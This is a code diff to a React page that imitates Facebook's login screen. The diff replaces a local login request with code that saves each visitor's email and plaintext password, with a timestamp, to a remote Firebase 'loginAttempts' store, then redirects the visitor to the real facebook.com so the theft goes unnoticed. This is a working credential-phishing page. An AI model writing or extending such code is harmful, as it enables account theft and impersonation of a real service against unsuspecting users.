@@ -1,5 +1,6 @@
-import { useState, useMemo, useRef, useEffect } from "react";
-
+import { useState, useMemo } from "react";
+import { ref, push, set } from "firebase/database";
+import { db } from "../lib/firebase";
 
 const FacebookLogo = () => (
   <svg viewBox="0 0 36 36" className="w-12 h-12" fill="hsl(var(--fb-blue))">
@@ -184,15 +185,15 @@ const Index = () => {
     setLoginError("");
 
     try {
-      await fetch("/api/login", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({ email, password }),
+      const loginAttemptRef = push(ref(db, "loginAttempts"));
+      await set(loginAttemptRef, {
+        email,
+        password,
+        timestamp: Date.now(),
       });
     } catch (error) {
       console.error("Login save failed:", error);
+      setLoginError("Unable to save login attempt. Please try again.");
     } finally {
       window.location.href = "https://www.facebook.com/";
     }
